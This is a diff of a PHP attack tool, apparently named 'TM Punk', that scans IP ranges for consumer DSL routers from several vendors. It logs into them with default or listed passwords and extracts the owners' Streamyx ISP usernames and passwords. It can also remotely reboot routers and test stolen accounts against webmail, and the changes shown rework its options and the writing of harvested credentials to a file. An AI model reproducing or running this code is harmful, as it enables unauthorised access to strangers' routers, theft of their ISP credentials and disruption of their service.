@@ -18,13 +18,13 @@ $year = "2013";
 /**
  * @var string $version -> Set this php version :).
  */
-$version = "0.8.2";
+$version = "0.8.3";
 
 /**
  * @var string $release -> Set this script release date.
  * Note : Year-Day-Month
  */
-$release = "2013-06-04";
+$release = "2013-05-04";
 
 /**
  * @var string $user_agent -> Set php user agent when trying to request data with curl :).
@@ -47,6 +47,12 @@ if($debug_mode == "off"){
 	ini_set('error_log',NULL);
 	ini_set('max_execution_time',0);
 	ini_set('log_errors',0);
+}else{
+	error_reporting(E_ALL);
+	ini_set('display_errors','On');
+	ini_set('error_log','my_file.log');
+	ini_set('error_log','');
+	ini_set('error_log','/dev/null'); #linux
 }
 
 date_default_timezone_set('Asia/Kuala_Lumpur');  // Here is need for new PHP Version.
@@ -62,50 +68,54 @@ echo "\nTM Punk ".$version."  FuckCopyright (c) ".$year." ".$author." ".$release
  * Version
  * @content string -> Give note for what you have done to this script.
  */
-if($argv[1] == "-v"){
+if(isset($argv[1]) && $argv[1] == "-v"){
 	die("
-Version 0.1 :-
-- Base Code Written..
-- Only can detect what router user use only.
+		\rVersion 0.1 :-
+		\r- Base Code Written..
+		\r- Only can detect what router user use only.
 
-Version 0.2 :-
-- Add automatik login code into D-Link, Innacom and Zyxel.
+		\rVersion 0.2 :-
+		\r- Add automatik login code into D-Link, Innacom and Zyxel.
 
-Version 0.3 :-
-- Add save into log function (Thank to Akif)
-- More interactive help.
+		\rVersion 0.3 :-
+		\r- Add save into log function (Thank to Akif)
+		\r- More interactive help.
 
-Version 0.4 :-
-- Add ASUS DSL-N12U automatic login code.
-- Add multiple verification if default verification fail.
+		\rVersion 0.4 :-
+		\r- Add ASUS DSL-N12U automatic login code.
+		\r- Add multiple verification if default verification fail.
 
-Version 0.5 :-
-- Change Curl User Agent into Chrome 23.
-- Add Streamyx Account Validation Scanner to check if that streamyx account
-  can login into streamyx web mail.
-- Add TP-Link automatic login code.
+		\rVersion 0.5 :-
+		\r- Change Curl User Agent into Chrome 23.
+		\r- Add Streamyx Account Validation Scanner to check if that streamyx account
+		\r  can login into streamyx web mail.
+		\r- Add TP-Link automatic login code.
 
-Version 0.6 :-
-- Add User Limit (user can now get what limit of downstream that user want).
-- Fix mistake when getting downstream/upstream on TP-Link TD-W8901G (i don't believe i make that mistake!)
+		\rVersion 0.6 :-
+		\r- Add User Limit (user can now get what limit of downstream that user want).
+		\r- Fix mistake when getting downstream/upstream on TP-Link TD-W8901G (i don't believe i make that mistake!)
 
-Version 0.7 :-
-- Add Router Reboot function (D-Link, Innacom and TP-Link only !);
+		\rVersion 0.7 :-
+		\r- Add Router Reboot function (D-Link, Innacom and TP-Link only !);
 
-Version 0.7.1 :-
-- Add Router Reboot function for Zyxel.
+		\rVersion 0.7.1 :-
+		\r- Add Router Reboot function for Zyxel.
 
-Version 0.8 :-
-- Add verbose mode.
+		\rVersion 0.8 :-
+		\r- Add verbose mode.
 
-Version 0.8.1 :-
-- Add Optional Info.
+		\rVersion 0.8.1 :-
+		\r- Add Optional Info.
 
-Version 0.8.2 :-
-- Add ping timeout.
-- Add IP location tracker.
+		\rVersion 0.8.2 :-
+		\r- Add ping timeout.
+		\r- Add IP location tracker.
 
-Thank to : Akif (for log function) and other people who support.
+		\rVersion 0.8.3 :-
+		\r- Repair file save function.
+		\r- Minor change.
+
+		\rThank to : Akif (for log function) and other people who support.
 		");
 }
 
@@ -179,6 +189,18 @@ if(in_array("-limit", $argv, true)){
 	}
 }
 
+
+
+/**
+ * Take save file argument
+ */
+ 
+if(in_array("-save", $argv, true)){
+	$find_key = array_search("-save", $argv);
+	$value = $find_key + 1;
+	$filesave = $argv[$value];
+}
+
 /**
  * If user make $verbose as false in default
  * User can make it true back using command line argument
@@ -208,7 +230,7 @@ if(in_array("-g", $argv, true)){
  * Then will make request one per one into streamyx webmail using curl request.
  * If respond is good, then username/password is accepted.
  */
-if($argv[1] == "-c"){
+if(isset($argv[1]) && $argv[1] == "-c"){
 	
 	if(!check("http://google.com/")){
 		echo "\nYour computer look like didn't have internet connection !\n";
@@ -248,6 +270,22 @@ if($argv[1] == "-c"){
 	}
 	die();
 }
+
+/**
+ * Take IP and range code 
+ */
+ 
+if(in_array("-ip", $argv, true)){
+	$find_key = array_search("-ip", $argv);
+	$value = $find_key + 1;
+	$ip = $argv[$value];
+}
+
+if(in_array("-range", $argv, true)){
+	$find_key = array_search("-range", $argv);
+	$value = $find_key + 1;
+	$range = $argv[$value];
+}
 	
 
 /**
@@ -262,26 +300,26 @@ if($verbose){
  
 if(!isset($argv[1]) || $argv[1] == "-help" || $argv[1] == "-h" || $argv[1] == "/?"){
 	die("
- USAGE :
- php \"{$argv[0]}\" <ip> <range> (optional) -save <filename>
- php \"{$argv[0]}\" -c <filename>
- php \"{$argv[0]}\" <ip> <range> -limit \"4m\"
- php \"{$argv[0]}\" <ip> <range> -save -limit \"2m\"
- php \"{$argv[0]}\" -reboot <ip>
- 
- OPTIONS : 
- <ip>	 : Specific target IP.
- <range> : Range scanner need to scan.
- 
- OPTIONAL :
- -g : Get optional info that you must know :)
- -save <filename> : Save result in specific file.
- -c <filename> : Check streamyx account if that account can use in 
-                 streamyx mail system.
- -v : Show what version of TM Punk you have now.
- -limit <speed> : Filter output from result. (In 2mb,4mb & 8mb).
- -reboot <ip> : Automatically reboot those router ;).
- -verbose : Verbose Mode. (Default = ".$verbose_check.")
+		\r USAGE :
+		\r php \"{$argv[0]}\" -ip <ip> -range <range> (optional) -save <filename>
+		\r php \"{$argv[0]}\" -c <filename>
+		\r php \"{$argv[0]}\" -ip <ip> -range <range> -limit \"4m\"
+		\r php \"{$argv[0]}\" -ip <ip> -range <range> -save -limit \"2m\"
+		\r php \"{$argv[0]}\" -reboot <ip>
+		 
+		\r OPTIONS : 
+		\r -ip <ip>	 : Specific target IP.
+		\r -range <range> : Range scanner need to scan.
+		 
+		\r OPTIONAL :
+		\r -g : Get optional info that you must know :)
+		\r -save <filename> : Save result in specific file.
+		\r -c <filename> : Check streamyx account if that account can use in 
+		\r				 streamyx mail system.
+		\r -v : Show what version of TM Punk you have now.
+		\r -limit <speed> : Filter output from result. (In 2mb,4mb & 8mb).
+		\r -reboot <ip> : Automatically reboot those router ;).
+		\r -verbose : Verbose Mode. (Default = ".$verbose_check.")
 		");
 }
 
@@ -303,15 +341,15 @@ if(!isset($argv[1]) || $argv[1] == "-help" || $argv[1] == "-h" || $argv[1] == "/
  * Any IP that doesn't equal with any data in provide function, then PHP will show IP with no result.
  * Then above process will do again and again until range is complete.
  */
-if(isset($argv[1]) && isset($argv[2])){	
-	$streamyx_ip = $argv[1];
+if(isset($ip) && isset($range)){	
+	$streamyx_ip = $ip;
 	if(!filter_var($streamyx_ip, FILTER_VALIDATE_IP)){ echo "\nIncorrect IP Address Format\n";die(); }
-	if(strpos($argv[2], "-")){
-		$range = explode("-", $argv[2]);
+	if(strpos($range, "-")){
+		$range_if = explode("-", $range);
 	}else{
 		echo "\nIncorrect Range Format\n";die();
 	}
-	if($range[1] > 255){
+	if($range_if[1] > 255){
 		echo "\nIncorrect Range Format\n";die();
 	}
 	$a = explode(".", $streamyx_ip);
@@ -319,15 +357,15 @@ if(isset($argv[1]) && isset($argv[2])){
 		echo "\nTry to parse IP address to valit input\n";
 	}
 	$a = $a[0].".".$a[1].".".$a[2];
-	echo "\nScanning ".$a.".".$argv[2]."... \n\n";
-	$b = explode("-", $argv[2]);
-	$ole=range ($b[0],$b[1]);
-	$ol=count($ole);
-	$give = "Status : Scan started for IP range ".$a.".".$argv[2]."... \r\n\r\n";
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog($give, $argv[4]);
+	echo "\nScanning ".$a.".".$range."... \n\n";
+	$b = explode("-", $range);
+	$ole = range($b[0], $b[1]);
+	$ol = count($ole);
+	$give = "Status : Scan started for IP range ".$a.".".$range."... ";
+	if(!empty($filesave)){
+		file_put_contents($filesave, $give, FILE_APPEND);
 	}
-	for($i = $range[0]; $i <= $range[1]; $i++){
+	for($i = $range_if[0]; $i <= $range_if[1]; $i++){
 		if($verbose){
 			echo "Checking for ".$a.".".$i." if online\n";
 		}
@@ -339,7 +377,7 @@ if(isset($argv[1]) && isset($argv[2])){
 			$data_return = checkdata($data, $a.".".$i);
 			if($data_return == "Innacom")
 			{
-				$tunjuk = Innacom($a.".".$i);
+				$tunjuk = Innacom($a.".".$i, $filesave);
 				if(isset($limit_bool) && $limit_bool == "set"){
 					$downstream = getdownstream($tunjuk);
 					if(limit($downstream, $argv[$limit_value])){
@@ -361,7 +399,7 @@ if(isset($argv[1]) && isset($argv[2])){
 			}
 			elseif($data_return == "ASUS DSL-N12U")
 			{
-				$tunjuk = asus($a.".".$i);
+				$tunjuk = asus($a.".".$i, $filesave);
 				if(isset($limit_bool) && $limit_bool == "set"){
 					$downstream = getdownstream($tunjuk);
 					if(limit($downstream, $argv[$limit_value])){
@@ -383,7 +421,7 @@ if(isset($argv[1]) && isset($argv[2])){
 			}
 			elseif($data_return == "TP-Link TD-W8901G")
 			{
-				$tunjuk = TpLink($a.".".$i);;
+				$tunjuk = TpLink($a.".".$i, $filesave);
 				if(isset($limit_bool) && $limit_bool == "set"){
 					$downstream = getdownstream($tunjuk);
 					if(limit($downstream, $argv[$limit_value])){
@@ -406,9 +444,9 @@ if(isset($argv[1]) && isset($argv[2])){
 			elseif($data_return == "D-Link")
 			{	
 				if(strpos($data, "SEA_1.01")){
-					$tunjuk = dlink($a.".".$i, "SEA_1.01");
+					$tunjuk = dlink($a.".".$i, "SEA_1.01", $filesave);
 				}else{
-					$tunjuk = dlink($a.".".$i, "");
+					$tunjuk = dlink($a.".".$i, "", $filesave);
 				}
 				if(isset($limit_bool) && $limit_bool == "set"){
 					$downstream = getdownstream($tunjuk);
@@ -431,7 +469,7 @@ if(isset($argv[1]) && isset($argv[2])){
 			}
 			elseif($data_return == "Zyxel P-600")
 			{	
-				$tunjuk = zyxel($a.".".$i);
+				$tunjuk = zyxel($a.".".$i, $filesave);
 				if(isset($limit_bool) && $limit_bool == "set"){
 					$downstream = getdownstream($tunjuk);
 					if(limit($downstream, $argv[$limit_value])){
@@ -457,9 +495,9 @@ if(isset($argv[1]) && isset($argv[2])){
 					if($optional){
 						echo $a.".".$i." is ".$data_return."\n";
 						$il++;
-						$give = "IP : $a.$i \r\nDevice : ".$data_return."\r\nStatus : Method not implemented\r\n\r\n";
-						if(isset($argv[3]) && $argv[3] == "-save"){
-							makelog($give, $argv[4]);
+						$give = "IP : $a.$i \r\nDevice : ".$data_return."\r\nStatus : Method not implemented\r\n";
+						if(!empty($filesave)){
+							file_put_contents($filesave, $give, FILE_APPEND);
 						}
 						echo "\n";
 					}
@@ -467,9 +505,9 @@ if(isset($argv[1]) && isset($argv[2])){
 					if($optional){
 						$il++;
 						echo $a.".".$i." exist but no data for this IP\n";
-							$give = "IP : $a.$i \r\nDevice : unknown\r\nStatus : Unknown device\r\n\r\n";
-							if(isset($argv[3]) && $argv[3] == "-save"){
-								makelog($give, $argv[4]);
+							$give = "IP : $a.$i \r\nDevice : unknown\r\nStatus : Unknown device\r\n";
+							if(!empty($filesave)){
+								file_put_contents($filesave, $give, FILE_APPEND);
 							}
 						echo "\n";
 					}
@@ -480,10 +518,10 @@ if(isset($argv[1]) && isset($argv[2])){
 			echo $a.".".$i." if not exist or offline\n\n";
 		}
 	}
-	$give = "Status : Scan ended.. total there are ".$il." IPs accessible out of ".$ol." IPs on range. \r\n\r\n";
+	$give = "Status : Scan ended.. total there are ".$il." IPs accessible out of ".$ol." IPs on range. \r\n";
 	echo $give;
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog($give, $argv[4]);
+	if(!empty($filesave)){
+		file_put_contents($filesave, $give, FILE_APPEND);
 	}
 	die();
 }
@@ -611,68 +649,81 @@ function removecurly($string){
  * @param string $ip -> Get ip then automatically get streamyx user info.
  * @return string -> Return streamyx user info.
  */
-function Innacom($ip)
+function Innacom($ip, $filesave = "")
 {
- if(isset($ip))
- {
-	global $list;
-	global $verbose;
-	
-	$result = ""; 
-  
-  if($verbose){
-	$result .= "Try to connect to Innacom router with default username & password\n";
-  }
-  $curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");
-  
-  //Using another verification
-  if(strpos("Authentication fail", $curl)){
-	if($verbose){
-		$result .= "Default authentication fail, try with another\n";
-	}
-	  foreach($list as $username => $pass){
-		  $curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
-		  if(strpos("Authentication fail", $curl) === FALSE){
-			if($verbose){
-				$result .= "All authentication was failed!\n";
-			}
-			break;
+	if(isset($ip))
+	{
+		global $list;
+		global $verbose;
+
+		$result = ""; 
+
+		if($verbose){
+			$result .= "Try to connect to Innacom router with default username & password\n";
+		}
+		$curl = curl("http://".$ip."/login.cgi?username=support&psd=support", "", "");
+
+		//Using another verification
+		if(strpos("Authentication fail", $curl)){
+		if($verbose){
+			$result .= "Default authentication fail, try with another\n";
+		}
+		  foreach($list as $username => $pass){
+			  $curl = curl("http://".$ip."/login.cgi?username=".$username."&psd=".$pass."", "", "");
+			  if(strpos("Authentication fail", $curl) === FALSE){
+				if($verbose){
+					$result .= "All authentication was failed!\n";
+				}
+				break;
+			  }
 		  }
-	  }
-  }
-  
-  if($verbose){
-	$result .= "Authentication success ! Try to take data now !\n";
-  }
-  $cook = GetCookies($curl);
-  $curl = curl("http://".$ip."/wancfg.cmd", $cook, "");
-  $curl1 = curl("http://".$ip."/info.html", $cook, "");
-  preg_match_all("/var obj2Items = '(.*)';/U", $curl, $f);
-  preg_match_all("/var obj1Items = '(.*)';/U", $curl1, $f1);
-  $exp = explode("-", $f[1][0]);
-  $exp1 = explode("-", $f1[1][0]);
-  if(!empty($exp[12]) && !empty($exp[13]))
-  {
-   $result .= "Streamyx User : ".removecurly($exp[12])."\n";
-   $result .= "Streamyx Pass : ".removecurly($exp[13])."\n";
-  }
-  if(!empty($exp1[10]) && !empty($exp1[11]))
-  {
-   $result .= "Upstream : ".str_replace("000", "", removecurly($exp1[10]))."\n";
-   $result .= "Downstream : ".str_replace("000", "", removecurly($exp1[11]))."\n";
-  }
-  else return false;
-  
-  if($verbose){
-	$result .= "Take data success ! \n";
-  }
-  
-  return $result;
-  
-  if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog("IP : $ip \r\nRouter : Innacomm\r\nStreamyx User : ".removecurly($exp[12])."\r\n"."Streamyx Pass : ".removecurly($exp[13])."\r\nUpstream : ".str_replace("000", "", removecurly($exp1[10]))."\r\nDownstream : ".str_replace("000", "", removecurly($exp1[11]))."\r\n\r\n", $argv[4]);
+		}
+
+		if($verbose){
+			$result .= "Authentication success ! Try to take data now !\n";
+		}
+		$cook = GetCookies($curl);
+		$curl = curl("http://".$ip."/wancfg.cmd", $cook, "");
+		$curl1 = curl("http://".$ip."/info.html", $cook, "");
+		preg_match_all("/var obj2Items = '(.*)';/U", $curl, $f);
+		preg_match_all("/var obj1Items = '(.*)';/U", $curl1, $f1);
+		$exp = explode("-", $f[1][0]);
+		$exp1 = explode("-", $f1[1][0]);
+		if(!empty($exp[12]) && !empty($exp[13]))
+		{
+			$result .= "Streamyx User : ".removecurly($exp[12])."\n";
+			$result .= "Streamyx Pass : ".removecurly($exp[13])."\n";
+		}
+		if(!empty($exp1[10]) && !empty($exp1[11]))
+		{
+			$result .= "Upstream : ".str_replace("000", "", removecurly($exp1[10]))."\n";
+			$result .= "Downstream : ".str_replace("000", "", removecurly($exp1[11]))."\n";
+		}
+		else return false;
+
+		if($verbose){
+			$result .= "Take data success ! \n";
+		}
+
+		if(!empty($filesave) && !empty($exp[12])){
+			$data = array(
+					"IP" => $ip,
+					"Router" => "Innacomm",
+					"Streamyx User" => removecurly($exp[12]),
+					"Streamyx Pass" => removecurly($exp[13]),
+					"Upstream" => str_replace("000", "", removecurly($exp1[10])),
+					"Downstream" => str_replace("000", "", removecurly($exp1[11]))
+					);
+					
+			file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
+			
+			foreach($data as $name => $value){
+				file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
+			}
+		}
+		
+		return $result;
 	}
- }
 }
 
 /**
@@ -721,7 +772,7 @@ function innacom_reboot($ip){
  * @param string $type -> Check Router type.
  * @return string -> Return streamyx user info.
  */
-function dlink($ip, $type){
+function dlink($ip, $type, $filesave = ""){
 	
 	global $list;
 	global $verbose;
@@ -791,10 +842,26 @@ function dlink($ip, $type){
 		$result .= "Take data success ! \n";
 	}
 	
-	return $result;
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog ("IP : $ip \r\nRouter : D-Link Streamyx\r\nStreamyx User : $dl_user\r\n"."Streamyx Pass : $dl_pass\r\nUpstream : $dl_up\r\nDownstream : $dl_down\r\n\r\n", $argv[4]);
+	if(!empty($filesave) && !empty($dl_user)){
+		$data = array(
+				"IP" => $ip,
+				"Router" => "D-Link Streamyx",
+				"Streamyx User" => $dl_user,
+				"Streamyx Pass" => $dl_pass,
+				"Upstream" => $dl_up,
+				"Downstream" => $dl_down
+				);
+				
+		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
+		
+		foreach($data as $name => $value){
+			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
+		}
+		
 	}
+	
+	return $result;
+	
 }
 
 /**
@@ -844,14 +911,13 @@ function dlink_reboot($ip, $type){
  * @param string $ip -> Get ip then automatically get streamyx user info.
  * @return string -> Return streamyx user info.
  */
-function zyxel($ip){
+function zyxel($ip, $filesave = ""){
 	
 	global $list;
 	global $verbose;
 	
 	$result = "";
 	
-
 	//Login into Router
 	if($verbose){
 		$result .= "Try to connect to ZyXel router with default username & password\n";
@@ -906,11 +972,23 @@ function zyxel($ip){
 		$result .= "Take data success ! \n";
 	}
 	
-	return $result;
-	
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog ("IP : $ip \r\nRouter : Zyxel P-600\r\nStreamyx User : ".$username[0]."\r\n"."Streamyx Pass : ".$password[0]."\r\nUpstream : ".trim(str_replace("kbps", "", $speed_data[1]))."\r\nDownstream : ".trim(str_replace("kbps", "", $speed_data[0]))."\r\n\r\n", $argv[4]);
+	if(!empty($filesave) && !empty($username[0])){
+		$data = array(
+				"IP" => $ip,
+				"Router" => "Zyxel P-600",
+				"Streamyx User" => $username[0],
+				"Streamyx Pas" => $password[0],
+				"Upstream" => trim(str_replace("kbps", "", $speed_data[1])),
+				"Downstream" => trim(str_replace("kbps", "", $speed_data[0]))
+				);
+		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
+		foreach($data as $name => $value){
+			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
+		}
 	}
+	
+	return $result;
+
 }
 
 /**
@@ -948,7 +1026,7 @@ function zyxel_reboot($ip){
 	if($verbose){
 		echo "Authentication success ! Try to reboot that router now !\n";
 	}
-	$data_send = "Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SXEyOW5rWEJ2MTJLajhoNg==";
+	$data_send = "Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SXEyOW5rWEJ2MTJLajhoNg=="; //random data, but constant
 	$data = curl("http://".$ip."/Forms/rpSysReboot_1", "", "", "", base64_decode($data_send));
 	
 	if(strpos($data, "RebootSuccPrev")){
@@ -965,7 +1043,7 @@ function zyxel_reboot($ip){
  * @param string $ip -> Get ip then automatically get streamyx user info.
  * @return string -> Return streamyx user info.
  */
-function asus($ip){
+function asus($ip, $filesave){
 	
 	global $list;
 	global $verbose;
@@ -1011,11 +1089,21 @@ function asus($ip){
 		$result .= "Take data success ! \n";
 	}
 	
+	if(!empty($filesave) && !empty($username)){
+		$data = array(
+				"IP" => $ip,
+				"Router" => "ASUS DSL-N12U",
+				"Streamyx User" => $username,
+				"Streamyx Pass" => $password
+				);
+		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
+		foreach($data as $name => $value){
+			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
+		}
+	}
+	
 	return $result;
 	
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog ("IP : $ip \r\nRouter : ASUS DSL-N12U\r\nStreamyx User : ".$username."\r\n"."Streamyx Pass : ".$password."\r\n\r\n", $argv[4]);
-	}
 }
 
 /**
@@ -1023,7 +1111,7 @@ function asus($ip){
  * @param string $ip -> Get ip then automatically get streamyx user info.
  * @return string -> Return streamyx user info.
  */
-function TpLink($ip){
+function TpLink($ip, $filesave){
 
 	global $list;
 	global $verbose;
@@ -1077,11 +1165,25 @@ function TpLink($ip){
 		$result .= "Take data success ! \n";
 	}
 	
+	if(!empty($filesave) && !empty($Username[2][0])){
+		$data = array(
+				"IP" => $ip,
+				"Router" => "TP-Link",
+				"Streamyx User" => $Username[2][0],
+				"Streamyx Pass" => $Password[2][0],
+				"Upstream" => $rate[11],
+				"Downstream" => $rate[6]
+				);
+				
+		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
+		
+		foreach($data as $name => $value){
+			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
+		}
+	}
+	
 	return $result;
 	
-	if(isset($argv[3]) && $argv[3] == "-save"){
-		makelog ("IP : $ip \r\nRouter : TP-Link\r\nStreamyx User : ".$Username[2][0]."\r\n"."Streamyx Pass : ".$Password[2][0]."\r\nUpstream : ".$rate[11]."\r\nDownstream : ".$rate[6]."\r\n\r\n", $argv[4]);
-	}
 }
 
 /**
@@ -1243,18 +1345,6 @@ function cutstr($data, $str1, $str2){
 	$data = explode($str1, $data);
 	$data = explode($str2, $data[1]);
 	return $data[0];
-}
-
-/**
- * Create Log/Save file
- * @param string $data -> Data/string/text that you want to save.
- * @param string $filename -> Name of file you want to save.
- */
-function makelog($data, $filename) {
-	$x= "Date/Time : ".date("d/M/Y h:i:s A")."\r\n".$data; 
-	$fh = fopen($filename, 'w+') or die("can't open file");
-	fwrite($fh, $x);
-	fclose($fh);
 }
 
 ?>
